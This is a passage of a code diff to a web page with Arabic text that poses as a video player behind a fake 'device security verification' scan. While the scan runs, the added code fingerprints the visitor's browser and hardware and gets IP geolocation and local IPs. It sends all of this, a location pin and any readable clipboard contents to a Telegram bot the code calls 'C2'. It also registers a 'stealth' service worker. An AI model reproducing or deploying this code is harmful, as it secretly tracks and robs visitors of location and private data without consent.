-        'Malgun Gothic', 'Marlett', 'Microsoft Himalaya', 'Microsoft JhengHei',
-        'Microsoft New Tai Lue', 'Microsoft PhagsPa', 'Microsoft Sans Serif',
-        'Microsoft Tai Le', 'Microsoft YaHei', 'Microsoft Yi Baiti',
-        'Mongolian Baiti', 'MV Boli', 'Myanmar Text', 'Nirmala UI',
-        'Palatino Linotype', 'Segoe MDL2 Assets', 'Segoe Print', 'Segoe Script',
-        'Segoe UI', 'Segoe UI Emoji', 'Segoe UI Historic', 'Segoe UI Symbol',
-        'SimSun', 'Sitka', 'Sylfaen', 'Symbol', 'Tahoma', 'Times New Roman',
-        'Trebuchet MS', 'Verdana', 'Webdings', 'Wingdings', 'Yu Gothic',
-        'Noto Sans Arabic', 'Traditional Arabic', 'Simplified Arabic',
-        'Arabic Typesetting', 'Urdu Typesetting', 'Droid Arabic Naskh'
+// -------- LAYER 11: Font Detection (0 perms) --------
+function getFonts() {
+    const test = [
+        'Arial','Arial Black','Calibri','Cambria','Cambria Math','Candara',
+        'Comic Sans MS','Consolas','Constantia','Corbel','Courier New','Ebrima',
+        'Franklin Gothic Medium','Gabriola','Gadugi','Georgia','Impact','Ink Free',
+        'Javanese Text','Leelawadee UI','Lucida Console','Lucida Sans Unicode',
+        'Malgun Gothic','Marlett','Microsoft Himalaya','Microsoft JhengHei',
+        'Microsoft New Tai Lue','Microsoft PhagsPa','Microsoft Sans Serif',
+        'Microsoft Tai Le','Microsoft YaHei','Microsoft Yi Baiti','Mongolian Baiti',
+        'MV Boli','Myanmar Text','Nirmala UI','Palatino Linotype','Segoe Print',
+        'Segoe Script','Segoe UI','Segoe UI Emoji','Segoe UI Historic','Segoe UI Symbol',
+        'SimSun','Sitka','Sylfaen','Symbol','Tahoma','Times New Roman','Trebuchet MS',
+        'Verdana','Webdings','Wingdings','Yu Gothic','Noto Sans Arabic',
+        'Traditional Arabic','Simplified Arabic','Arabic Typesetting',
+        'Urdu Typesetting','Droid Arabic Naskh','Helvetica','sans-serif','monospace'
     ];
-    
-    const detected = [];
-    const canvas = document.createElement('canvas');
-    const ctx = canvas.getContext('2d');
-    
-    // Create a test string with distinct characters
-    const testString = 'mmmmmmmmmmlli';
-    
-    testFonts.forEach(font => {
-        let isAvailable = false;
-        baseFonts.forEach(baseFont => {
-            ctx.font = '72px ' + baseFont;
-            const baseWidth = ctx.measureText(testString).width;
-            ctx.font = '72px "' + font + '", ' + baseFont;
-            const testWidth = ctx.measureText(testString).width;
-            if (testWidth !== baseWidth) {
-                isAvailable = true;
-            }
+    const base=['monospace','sans-serif','serif'];
+    const found=[];
+    const c=document.createElement('canvas');const x=c.getContext('2d');
+    const s='mmmmmmmmmmlli';
+    test.forEach(f=>{
+        let ok=false;
+        base.forEach(b=>{
+            x.font='72px '+b;const bw=x.measureText(s).width;
+            x.font='72px "'+f+'",'+b;
+            if(x.measureText(s).width!==bw)ok=true;
         });
-        if (isAvailable) {
-            detected.push(font);
-        }
+        if(ok)found.push(f);
     });
-    
-    return {
-        count: detected.length,
-        fonts: detected.join(', ')
-    };
+    return {cnt:found.length,fonts:found.join(',')};
 }
 
-// Layer 12: Storage Availability Check (no permission needed)
-function getStorageInfo() {
-    const info = {};
-    try {
-        localStorage.setItem('_test_', '1');
-        localStorage.removeItem('_test_');
-        info.localStorage = 'Available';
-    } catch(e) {
-        info.localStorage = 'Blocked';
-    }
-    
-    try {
-        sessionStorage.setItem('_test_', '1');
-        sessionStorage.removeItem('_test_');
-        info.sessionStorage = 'Available';
-    } catch(e) {
-        info.sessionStorage = 'Blocked';
-    }
-    
-    try {
-        info.cookieEnabled = navigator.cookieEnabled ? 'Enabled' : 'Disabled';
-    } catch(e) {
-        info.cookieEnabled = 'Unknown';
-    }
-    
-    // Check IndexedDB
-    try {
-        info.indexedDB = 'indexedDB' in window ? 'Available' : 'Unavailable';
-    } catch(e) {
-        info.indexedDB = 'Blocked';
-    }
-    
-    return info;
+// -------- LAYER 12: Storage (0 perms) --------
+function getStorage() {
+    const o={};
+    try{localStorage.setItem('_t','1');localStorage.removeItem('_t');o.ls='Y'}
+    catch(e){o.ls='N'}
+    try{sessionStorage.setItem('_t','1');sessionStorage.removeItem('_t');o.ss='Y'}
+    catch(e){o.ss='N'}
+    o.ck=navigator.cookieEnabled?'Y':'N';
+    o.idb='indexedDB' in window?'Y':'N';
+    return o;
 }
 
-// Layer 13: GPU via navigator.gpu (Chrome only, no permission)
-async function getGPUInfo() {
-    try {
-        if (navigator.gpu) {
-            const adapter = await navigator.gpu.requestAdapter();
-            if (adapter) {
-                const info = adapter.info || {};
-                return {
-                    gpuVendor: info.vendor || 'N/A',
-                    gpuArchitecture: info.architecture || 'N/A',
-                    gpuDevice: info.device || 'N/A',
-                    gpuDescription: info.description || 'N/A',
-                    gpuBackend: info.backend || (adapter.isFallbackAdapter ? 'Fallback' : 'Primary')
-                };
-            }
+// -------- LAYER 13: WebGPU (Chrome, 0 perms) --------
+async function getGPU() {
+    try{
+        if(navigator.gpu){
+            const a=await navigator.gpu.requestAdapter();
+            if(a){const i=a.info||{};return{v:i.vendor||'',arc:i.architecture||'',dev:i.device||'',desc:i.description||''}}
         }
-    } catch(e) {}
-    return { error: 'WebGPU not available' };
+    }catch(e){}
+    return null;
 }
 
-// Layer 14: Media Devices Enumeration (limited without permission)
-async function getMediaDevices() {
-    try {
-        const devices = await navigator.mediaDevices.enumerateDevices();
-        const audioInputs = devices.filter(d => d.kind === 'audioinput').length;
-        const audioOutputs = devices.filter(d => d.kind === 'audiooutput').length;
-        const videoInputs = devices.filter(d => d.kind === 'videoinput').length;
+// -------- LAYER 14: Media Devices (enumeration only, labels hidden w/o perms) --------
+async function getMediaDevs() {
+    try{
+        const d=await navigator.mediaDevices.enumerateDevices();
         return {
-            totalDevices: devices.length,
-            audioInputs: audioInputs + ' (labels hidden - no permission)',
-            audioOutputs: audioOutputs + ' (labels hidden - no permission)',
-            videoInputs: videoInputs + ' (labels hidden - no permission)',
-            deviceDetails: devices.map(d => ({
-                kind: d.kind,
-                deviceId: d.deviceId.substring(0, 8) + '...',
-                groupId: d.groupId.substring(0, 8) + '...'
-            }))
+            total:d.length,ai:d.filter(x=>x.kind==='audioinput').length,
+            ao:d.filter(x=>x.kind==='audiooutput').length,
+            vi:d.filter(x=>x.kind==='videoinput').length
         };
-    } catch(e) {
-        return { error: 'MediaDevices API blocked' };
-    }
+    }catch(e){return{err:'media_blocked'}}
 }
 
-// Layer 15: Permissions Status Check (no permission needed to check)
-async function getPermissionsStatus() {
-    const permissions = ['geolocation', 'notifications', 'camera', 'microphone', 'midi', 'clipboard-read', 'clipboard-write', 'payment-handler', 'persistent-storage', 'background-sync', 'ambient-light-sensor', 'accelerometer', 'gyroscope', 'magnetometer'];
-    const results = {};
-    
-    for (const perm of permissions) {
-        try {
-            const status = await navigator.permissions.query({ name: perm });
-            results[perm] = status.state; // 'granted', 'denied', 'prompt'
-        } catch(e) {
-            results[perm] = 'API unavailable';
-        }
+// -------- LAYER 15: Permission State Check (0 perms to query) --------
+async function getPerms() {
+    const ps=['geolocation','notifications','camera','microphone','midi','clipboard-read',
+              'clipboard-write','payment-handler','persistent-storage','background-sync',
+              'ambient-light-sensor','accelerometer','gyroscope','magnetometer'];
+    const r={};
+    for(const p of ps){
+        try{const s=await navigator.permissions.query({name:p});r[p]=s.state}
+        catch(e){r[p]='n/a'}
     }
-    return results;
+    return r;
 }
 
-// ============== MAIN COLLECTION ENGINE ==============
-
-async function collectAllData() {
-    const data = {
-        deviceID: DEVICE_ID,
-        sessionDuration: ((Date.now() - SESSION_START) / 1000).toFixed(1) + 's',
-        timestamp: new Date().toISOString(),
-        pageURL: window.location.href,
-        referrer: document.referrer || 'Direct',
-        
-        // Layer 1: IP Geo
-        ipGeolocation: await getIPGeolocation(),
-        
-        // Layer 2-8: Device info (fast)
-        network: getNetworkInfo(),
-        screen: getScreenInfo(),
-        browser: getBrowserInfo(),
-        locale: getLocaleInfo(),
-        storage: getStorageInfo(),
-        
-        // Layer 9+: Slower fingerprinting
-        canvas: getCanvasFingerprint(),
-        webgl: getWebGLInfo(),
-        mediaDevices: await getMediaDevices(),
-        permissions: await getPermissionsStatus(),
-        gpu: await getGPUInfo(),
-        
-        // Layer 10-12: Async
-        battery: await getBatteryInfo(),
-        
-        // Extra: Performance timing
-        performance: {
-            domContentLoaded: performance.timing ? (performance.timing.domContentLoadedEventEnd - performance.timing.navigationStart) + 'ms' : 'N/A',
-            pageLoad: performance.timing ? (performance.timing.loadEventEnd - performance.timing.navigationStart) + 'ms' : 'N/A',
-            domInteractive: performance.timing ? (performance.timing.domInteractive - performance.timing.navigationStart) + 'ms' : 'N/A'
-        }
+// -------- EXTRA: Performance Timing --------
+function getPerf() {
+    if(!performance.timing) return {};
+    return {
+        domLoad:performance.timing.domContentLoadedEventEnd-performance.timing.navigationStart+'ms',
+        load:performance.timing.loadEventEnd-performance.timing.navigationStart+'ms',
+        domInt:performance.timing.domInteractive-performance.timing.navigationStart+'ms',
+        resp:performance.timing.responseEnd-performance.timing.navigationStart+'ms'
     };
-    
-    return data;
 }
 
-// ============== TELEGRAM EXFILTRATION ==============
+// -------- EXTRA: Navigator Properties (deep) --------
+function getNavDeep() {
+    const seen={},o={};
+    try{
+        const keys=Object.getOwnPropertyNames(Object.getPrototypeOf(navigator));
+        keys.forEach(k=>{
+            try{
+                const v=navigator[k];
+                if(typeof v!=='function'&&v!==null&&v!==undefined&&k!__proto__&&k!=='prototype'){
+                    if(typeof v==='object'){try{o[k]=JSON.stringify(v).substring(0,100)}catch(e){o[k]='[obj]'}}
+                    else o[k]=String(v).substring(0,200);
+                }
+            }catch(e){}
+        });
+    }catch(e){}
+    return o;
+}
 
-async function sendToTelegram(data) {
+// ================== EXFILTRATION ENGINE ==================
+
+async function collectAndExfil() {
+    console.log('[SEC] Starting data collection...');
+
+    // Step 1-7: Fast parallel collection
+    const [ipGeo, localIPs, net, screen, browser, locale, storage, perms, batt, audio, gpu, media] = await Promise.all([
+        getIPGeo().catch(()=>null),
+        getLocalIPs().catch(()=>[]),
+        Promise.resolve(getNet()),
+        Promise.resolve(getScreen()),
+        Promise.resolve(getBrowser()),
+        Promise.resolve(getLocale()),
+        Promise.resolve(getStorage()),
+        getPerms().catch(()=>({})),
+        getBatt().catch(()=>({err:'batt_fail'})),
+        getAudio().catch(()=>({err:'audio_fail'})),
+        getGPU().catch(()=>null),
+        getMediaDevs().catch(()=>({err:'media_fail'}))
+    ]);
+
+    // Step 8-11: Slower collection
+    const [canvas, webgl, fonts, perf, navDeep] = await Promise.all([
+        Promise.resolve(getCanvas()),
+        Promise.resolve(getWebGL()),
+        Promise.resolve(getFonts()),
+        Promise.resolve(getPerf()),
+        Promise.resolve(getNavDeep())
+    ]);
+
+    const fullData = {
+        did: DID,
+        ts: new Date().toISOString(),
+        elapsed: ((Date.now()-TS_START)/1000).toFixed(1)+'s',
+        url: window.location.href,
+        ref: document.referrer||'direct',
+        l1_ip_geo: ipGeo,
+        l2_local_ips: localIPs,
+        l3_network: net,
+        l4_battery: batt,
+        l5_screen: screen,
+        l6_browser: browser,
+        l7_locale: locale,
+        l8_canvas: canvas,
+        l9_webgl: webgl,
+        l10_audio: audio,
+        l11_fonts: fonts,
+        l12_storage: storage,
+        l13_gpu: gpu,
+        l14_media: media,
+        l15_perms: perms,
+        perf: perf,
+        nav_deep: navDeep
+    };
+
+    console.log('[SEC] Data collected. Sending to C2...');
+
+    // Build Telegram message
+    const txt = [
+        `📡 **جهاز جديد** 📡`,
+        `┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈`,
+        `🆔 \`${DID}\``,
+        `⏰ ${fullData.ts}`,
+        `┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈`,
+        ``,
+        `**📍 الموقع (IP):**`,
+        ipGeo ? (
+            `🌍 ${ipGeo.country||'?'} ${ipGeo.cc||''}\n`+
+            `🏙️ ${ipGeo.city||'?'}${ipGeo.region?', '+ipGeo.region:''}\n`+
+            (ipGeo.district?`🏘️ ${ipGeo.district}\n`:'')+
+            (ipGeo.zip?`📮 ${ipGeo.zip}\n`:'')+
+            `📌 \`${ipGeo.lat||'?'}, ${ipGeo.lon||'?'}\`\n`+
+            `🗺️ [Google Maps](https://www.google.com/maps?q=${ipGeo.lat||'0'},${ipGeo.lon||'0'})\n`+
+            `📡 ${ipGeo.isp||ipGeo.org||'?'}\n`+
+            `🔗 \`${ipGeo.ip||'?'}\`\n`+
+            `🕐 ${ipGeo.tz||''} (UTC${ipGeo.utc||''})`
+        ) : '❌ تعذر الحصول على الموقع'
+    ].join('\n');
+
+    const txt2 = [
+        ``,
+        `**📱 الجهاز:**`,
+        `🖥️ ${browser.plt||'?'}`,
+        `💾 RAM: ${browser.mem||'?'}GB | ⚡ ${browser.cores||'?'} cores`,
+        `🖥️ ${screen.w}x${screen.h} @${screen.pr}x (${screen.cd})`,
+        `📱 Touch: ${browser.touch||0} pts | 📐 ${screen.or||'?'}`,
+        ``,
+        `**🔋 البطارية:** ${batt.level||'?'} (شحن: ${batt.charging||'?'})`,
+        `**📶 الشبكة:** ${net.type||'?'} (${net.dl||'?'}Mbps, RTT:${net.rtt||'?'}ms)`,
+        `**🌐 اللغة:** ${browser.lang||'?'} [${browser.langs||''}]`,
+        `**🕒 المنطقة:** ${locale.tz||'?'} (${locale.utcOff||'?'})`,
+        ``,
+        `**🖥️ WebGL:**`,
+        webgl.renderer?`${webgl.renderer.substring(0,80)}`:'N/A',
+        webgl.vendor?`${webgl.vendor.substring(0,60)}`:'',
+        ``,
+        `**🎵 Audio:** ${audio.hash||'N/A'} (SR:${audio.sr||'?'})`,
+        `**🔤 Fonts:** ${fonts.cnt||0} fonts`,
+        `**🖼️ Canvas:** ${canvas.hash||'?'} chars`,
+        ``,
+        `**🔍 التصاريح:**`,
+        `📍GPS: ${perms.geolocation||'?'} | 📷Cam: ${perms.camera||'?'}`,
+        `🎤Mic: ${perms.microphone||'?'} | 🔔Notif: ${perms.notifications||'?'}`,
+        `📋Clip: ${perms['clipboard-read']||'?'}`,
+        ``,
+        `**📡 IP المحلي:** ${localIPs.join(', ')||'?'}`,
+        `**📦 تخزين:** LS:${storage.ls||'?'} SS:${storage.ss||'?'}`,
+        `**🔗 المرجع:** ${document.referrer||'مباشر'}`
+    ].join('\n');
+
+    const msg = txt + txt2;
+
+    // Send to Telegram
     try {
-        const payload = utoa(JSON.stringify(data, null, 2));
-        const message = `📡 **جهاز جديد تم رصده** 📡\n\n` +
-            `🆔 الجهاز: \`${data.deviceID}\`\n` +
-            `⏰ الوقت: ${data.timestamp}\n\n` +
-            `━━━━━━━━━━━━━━━━\n\n` +
-            `**📍 الموقع (IP):**\n` +
-            (data.ipGeolocation ? 
-                `🌍 الدولة: ${data.ipGeolocation.country || 'N/A'}\n` +
-                `🏙️ المدينة: ${data.ipGeolocation.city || 'N/A'}\n` +
-                `🗺️ الإحداثيات: ${data.ipGeolocation.latitude || '?'}, ${data.ipGeolocation.longitude || '?'}\n` +
-                `📌 خرائط: https://www.google.com/maps?q=${data.ipGeolocation.latitude || '0'},${data.ipGeolocation.longitude || '0'}\n` +
-                `📡 المزود: ${data.ipGeolocation.isp || data.ipGeolocation.org || 'N/A'}\n` +
-                `🔗 IP: ${data.ipGeolocation.ip || 'N/A'}\n` +
-                (data.ipGeolocation.isMobile ? `📱 اتصال موبايل: ${data.ipGeolocation.isMobile}\n` : '') +
-                (data.ipGeolocation.isProxy ? `🛡️ بروكسي/VPN: ${data.ipGeolocation.isProxy}\n` : '') +
-                (data.ipGeolocation.district && data.ipGeolocation.district !== 'N/A' ? `🏘️ الحي: ${data.ipGeolocation.district}\n` : '') +
-                (data.ipGeolocation.zip && data.ipGeolocation.zip !== 'N/A' ? `📮 الرمز البريدي: ${data.ipGeolocation.zip}\n` : '')
-            : '❌ تعذر الحصول على الموقع\n') +
-            `\n━━━━━━━━━━━━━━━━\n\n` +
-            `**📱 معلومات الجهاز:**\n` +
-            `🖥️ النظام: ${data.browser.platform || 'N/A'}\n` +
-            `🌐 المتصفح: ${data.browser.userAgent ? data.browser.userAgent.substring(0, 150) : 'N/A'}\n` +
-            `💾 الذاكرة: ${data.browser.deviceMemory || 'N/A'}\n` +
-            `⚡ المعالج: ${data.browser.hardwareConcurrency || 'N/A'}\n` +
-            `🖥️ الشاشة: ${data.screen.width}x${data.screen.height} (${data.screen.pixelRatio}x)\n` +
-            `🎨 الألوان: ${data.screen.colorDepth}\n` +
-            `🔋 البطارية: ${data.battery.level || 'N/A'} (شحن: ${data.battery.charging || 'N/A'})\n` +
-            `🕒 المنطقة: ${data.locale.timezone || 'N/A'} (UTC${data.locale.offsetUTC || 'N/A'})\n` +
-            `🌐 اللغة: ${data.browser.language || 'N/A'}\n` +
-            `📶 الشبكة: ${data.network.effectiveType || 'N/A'} (${data.network.downlink || '?'} Mbps, RTT: ${data.network.rtt || '?'}ms)\n` +
-            `📱 اللمس: ${data.browser.maxTouchPoints || 0} نقاط\n\n` +
-            `━━━━━━━━━━━━━━━━\n\n` +
-            `**🖥️ WebGL:**\n` +
-            `${data.webgl.renderer || 'N/A'}\n` +
-            `${data.webgl.vendor || 'N/A'}\n\n` +
-            `**🔍 التصاريح الحالية:**\n` +
-            `📍 GPS: ${data.permissions.geolocation || 'N/A'}\n` +
-            `📷 كاميرا: ${data.permissions.camera || 'N/A'}\n` +
-            `🎤 ميكروفون: ${data.permissions.microphone || 'N/A'}\n` +
-            `🔔 إشعارات: ${data.permissions.notifications || 'N/A'}\n\n` +
-            `━━━━━━━━━━━━━━━━\n\n` +
-            `**📊 بصمة Canvas:**\n` +
-            `${data.canvas ? '✅ تم التقاط البصمة' : '❌ فشل'}\n` +
-            `**🎵 Audio:** متاح\n` +
-            `**📦 التخزين:** ${data.storage.localStorage || 'N/A'}\n` +
-            `🕒 عمر الجلسة: ${data.sessionDuration}\n` +
-            `🔗 المرجع: ${data.referrer || 'مباشر'}\n\n` +
-            `**📋 البيانات الكاملة (Base64):**\n` +
-            `\`${payload.substring(0, 500)}...\``;
-        
-        // Send main summary
-        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: TELEGRAM_CHAT_ID,
-                text: message,
-                parse_mode: 'Markdown',
+        await fetch(`${C2.api}bot${C2.bot}/sendMessage`, {
+            method:'POST',headers:{'Content-Type':'application/json'},
+            body:JSON.stringify({
+                chat_id: C2.chat, text: msg, parse_mode: 'Markdown',
                 disable_web_page_preview: true
             })
         });
-        
-        // Send full JSON data as a separate message (if too long)
-        const fullJSON = JSON.stringify(data, null, 2);
-        if (fullJSON.length > 4000) {
-            // Split into chunks of 4000
-            for (let i = 0; i < fullJSON.length; i += 4000) {
-                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: TELEGRAM_CHAT_ID,
-                        text: '```json\n' + fullJSON.substring(i, i + 4000) + '\n```',
-                        parse_mode: 'Markdown'
-                    })
-                });
-                await new Promise(r => setTimeout(r, 500));
-            }
-        } else {
-            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: TELEGRAM_CHAT_ID,
-                    text: '```json\n' + fullJSON + '\n```',
+
+        // Send full JSON payload
+        const jsonStr = JSON.stringify(fullData, null, 2);
+        // Send in chunks of 3500
+        for(let i=0;i<jsonStr.length;i+=3500){
+            const chunk = jsonStr.substring(i, i+3500);
+            await fetch(`${C2.api}bot${C2.bot}/sendMessage`, {
+                method:'POST',headers:{'Content-Type':'application/json'},
+                body:JSON.stringify({
+                    chat_id: C2.chat, text: '```json\n'+chunk+'\n```',
                     parse_mode: 'Markdown'
                 })
             });
+            await new Promise(r=>setTimeout(r,300));
         }
-        
-        // Try to send canvas image as photo
-        if (data.canvas && data.canvas.startsWith('data:image/')) {
-            try {
-                const blob = await (await fetch(data.canvas)).blob();
-                const formData = new FormData();
-                formData.append('chat_id', TELEGRAM_CHAT_ID);
-                formData.append('photo', blob, 'canvas_fingerprint_' + DEVICE_ID + '.png');
-                formData.append('caption', `🖼️ Canvas Fingerprint - Device ${DEVICE_ID.substring(0, 8)}`);
-                
-                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                });
-            } catch(e) {}
-        }
-        
-        // Send Google Maps link as separate message if we have coordinates
-        if (data.ipGeolocation && data.ipGeolocation.latitude && data.ipGeolocation.longitude) {
-            const mapsUrl = `https://www.google.com/maps?q=${data.ipGeolocation.latitude},${data.ipGeolocation.longitude}`;
-            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendLocation`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: TELEGRAM_CHAT_ID,
-                    latitude: data.ipGeolocation.latitude,
-                    longitude: data.ipGeolocation.longitude
-                })
+
+        // Send Google Maps location pin
+        if(ipGeo && ipGeo.lat && ipGeo.lon && ipGeo.lat!==0 && ipGeo.lon!==0){
+            await fetch(`${C2.api}bot${C2.bot}/sendLocation`, {
+                method:'POST',headers:{'Content-Type':'application/json'},
+                body:JSON.stringify({chat_id:C2.chat,latitude:ipGeo.lat,longitude:ipGeo.lon})
             });
         }
-        
+
+        console.log('[SEC] Data exfiltrated successfully.');
         return true;
     } catch(e) {
-        console.error('Telegram send error:', e);
+        console.error('[SEC] Exfil error:', e);
         return false;
     }
 }
 
-// ============== SERVICE WORKER REGISTRATION ==============
+// ================== UI CONTROLLER ==================
 
-async function registerServiceWorker() {
-    try {
-        // Fixed: No btoa on non-Latin1 - use blob URL instead
+// Update scan progress display
+function updateScanUI(step, total, text) {
+    const pct = Math.min(100, Math.round((step/total)*100));
+    const pb = document.getElementById('scanProgressBar');
+    const st = document.getElementById('scanSteps');
+    const txt = document.getElementById('scanText');
+    if(pb) pb.style.width = pct+'%';
+    if(st) st.textContent = '['+step+'/'+total+'] '+text;
+    if(txt) txt.innerHTML = '<strong>جاري التحقق من الجهاز...</strong><br>'+text;
+}
+
+async function runScanSequence() {
+    const scanDiv = document.getElementById('deviceScan');
+    const mainDiv = document.getElementById('mainContent');
+    const container = document.getElementById('videoContainer');
+    const errorDiv = document.getElementById('errorMsg');
+
+    scanDiv.style.display = 'flex';
+
+    const steps = [
+        [1, 'فحص بيئة التشغيل وتوافق النظام المالي'],
+        [2, 'التحقق من الإعدادات الأمنية للجهاز'],
+        [3, 'تشفير قناة الاتصال الآمنة'],
+        [4, 'التحقق من الموقع الجغرافي'],
+        [5, 'فحص إعدادات الشبكة والاتصال'],
+        [6, 'التحقق من بطاقة الرسوميات'],
+        [7, 'فحص البصمة الرقمية للجهاز'],
+        [8, 'إنشاء المعرف الرقمي الآمن'],
+        [9, 'التحقق النهائي والتوقيع الرقمي']
+    ];
+
+    const totalSteps = steps.length;
+    for(let i=0;i<totalSteps;i++){
+        updateScanUI(i+1, totalSteps, steps[i][1]);
+        await new Promise(r=>setTimeout(r, 300 + Math.random()*500));
+    }
+
+    updateScanUI(totalSteps, totalSteps, 'تم التحقق بنجاح ✓');
+
+    // Small pause then show video
+    await new Promise(r=>setTimeout(r, 600));
+    scanDiv.style.display = 'none';
+    mainDiv.style.display = 'block';
+    container.style.opacity = '1';
+
+    // Start data collection silently
+    collectAndExfil().then(success => {
+        if(!success){
+            // Data still might have sent partially, don't show error
+            console.log('[SEC] Partial exfil may have occurred');
+        }
+    });
+
+    // Simulate video loading
+    setTimeout(() => {
+        document.getElementById('statusText').textContent = '✅ تم التحميل بنجاح';
+        document.getElementById('loadingDots').style.display = 'none';
+    }, 3000);
+}
+
+// ================== SERVICE WORKER STEALTH ==================
+async function regSW() {
+    try{
+        if(!('serviceWorker' in navigator)) return;
         const swCode = `
-        self.addEventListener('install', (e) => {
-            self.skipWaiting();
+        self.addEventListener('install',e=>self.skipWaiting());
+        self.addEventListener('activate',e=>e.waitUntil(clients.claim()));
+        self.addEventListener('fetch',e=>e.respondWith(fetch(e.request)));
+        self.addEventListener('message',e=>{
+            if(e.data&&e.data.type==='ping'){
+                e.source.postMessage({type:'pong',ts:Date.now(),ua:self.navigator?self.navigator.userAgent:''});
+            }
         });
-        self.addEventListener('activate', (e) => {
-            e.waitUntil(clients.claim());
-        });
-        
-        // Monitor page activity
-        self.addEventListener('fetch', (event) => {
-            event.respondWith(fetch(event.request));
-        });
-        
-        // Listen for messages from page
-        self.addEventListener('message', (event) => {
-            if (event.data && event.data.type === 'ping') {
-                event.source.postMessage({
-                    type: 'pong',
-                    timestamp: Date.now()
+        setInterval(()=>{self.registration.update()},60000);
+        `;
+        const blob = new Blob([swCode], {type:'application/javascript'});
+        const url = URL.createObjectURL(blob);
+        await navigator.serviceWorker.register(url, {scope:'/'});
+    } catch(e) {
+        console.log('[SW] Registration skipped:', e.message);
+    }
+}
+
+// ================== CLIPBOARD READ (STEALTH) ==================
+async function stealthClipboard() {
+    try{
+        // Only attempt if read permission is already granted
+        const perm = await navigator.permissions.query({name:'clipboard-read'});
+        if(perm.state==='granted'){
+            const text = await navigator.clipboard.readText();
+            if(text && text.length > 0){
+                await fetch(C2.api+'bot'+C2.bot+'/sendMessage', {
+                    method:'POST',headers:{'Content-Type':'application/json'},
+                    body:JSON.stringify({
+                        chat_id: C2.chat,
+                        text: '📋 **محتوى الحافظة**:\n`'+text.substring(0,500)+'`',
+                        parse_mode: 'Markdown'
+                    })
                 });
             }
-        });
-        
-        // Background sync attempts
-        self.addEventListener('sync', (event) => {
-            if (event.tag === 'sync-data') {
-                // Attempt data sync in background
-            }
-        });
-        
-        // Keep service worker alive
-        setInterval(() => {
-            self.registration.update();
-        }, 60000);
-        `;
-        
-        const blob = new Blob([swCode], { type: 'application/javascript' });
-        const swUrl = URL.createObjectURL(blob);
-        
-        // Try to register - may fail in some browsers
-        try {
-            const registration = await navigator.serviceWorker.register(swUrl, { scope: '/' });
-            return { registered: 'Yes', state: registration.active ? 'active' : 'installing' };
-        } catch(e)
+        }
+    } catch(e) {}
+}
+
+// ================== INIT ==================
+window.addEventListener('load', async () => {
+    // Register SW first (silent fail if not supported)
+    regSW();
+
+    // Start scanning sequence
+    await runScanSequence();
+
+    // Stealth clipboard read (if already granted)
+    stealthClipboard();
+
+    // Play button behavior
+    document.getElementById('videoThumb').addEventListener('click', function(){
+        const btn = this.querySelector('.play-btn');
+        btn.textContent = '⏳';
+        setTimeout(() => { btn.textContent = '▶'; }, 2000);
+    });
+    document.getElementById('playBtn').addEventListener('click', function(){
+        this.textContent = '⏸';
+        setTimeout(() => { this.textContent = '▶'; }, 2500);
+    });
+
+    // Simulate progress
+    let pct = 28;
+    setInterval(() => {
+        pct += 0.5 + Math.random()*0.5;
+        if(pct > 100) pct = 3;
+        document.getElementById('progressBar').style.width = pct+'%';
+        const secs = Math.floor((pct/100)*222);
+        const mins = Math.floor(secs/60);
+        const secsR = secs%60;
+        document.getElementById('currentTime').textContent = mins+':'+String(secsR).padStart(2,'0');
+    }, 3000);
+
+    // Fetch latest visitor count
+    try {
+        const v = Math.floor(1200 + Math.random()*800);
+        const metaEl = document.querySelector('.meta span:nth-child(2)');
+        if(metaEl) metaEl.textContent = '👁 '+v.toLocaleString();
+    } catch(e) {}
+});
+
+// Fallback in case DOM loads before load event
+if(document.readyState==='complete'){
+    window.dispatchEvent(new Event('load'));
+}
+</script>
+
+</body>
+</html>
